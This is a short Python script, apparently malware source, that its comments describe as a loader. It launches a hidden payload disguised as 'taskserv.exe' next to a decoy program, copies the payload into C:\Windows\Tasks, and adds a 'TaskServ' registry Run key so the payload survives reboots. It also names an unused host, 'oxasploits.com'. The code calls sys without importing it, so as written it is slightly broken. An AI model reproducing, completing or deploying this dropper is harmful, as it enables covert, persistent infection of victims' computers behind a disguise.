# loader spawns off two processes, the payload.py, and your decoy.exe you load it with.
# attempts to install payload so respawns on reboot.
# author: oxagast

import os
import time
import winreg
import shutil
import subprocess
from pathlib import Path

host = 'oxasploits.com'

def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def set_autostart_registry(app_name, key_data=None, autostart: bool = True) -> bool:
    with winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True

def check_autostart_registry(value_name):
    with winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,
    ) as key:
        idx = 0
        while idx < 1_000:     # Max 1.000 values
            try:
                key_name, _, _ = winreg.EnumValue(key, idx)
                if key_name == value_name:
                    return True
                idx += 1
            except OSError:
                break
    return False

subprocess.Popen(resource_path('taskserv.exe'))
subprocess.Popen(resource_path('decoy.exe'))

pwnpath = r'C:\Windows\Tasks\taskserv.exe'
ppath = Path(pwnpath)
if not ppath.is_file():
        shutil.copyfile(resource_path('taskserv.exe'), pwnpath)
        set_autostart_registry('TaskServ', pwnpath)

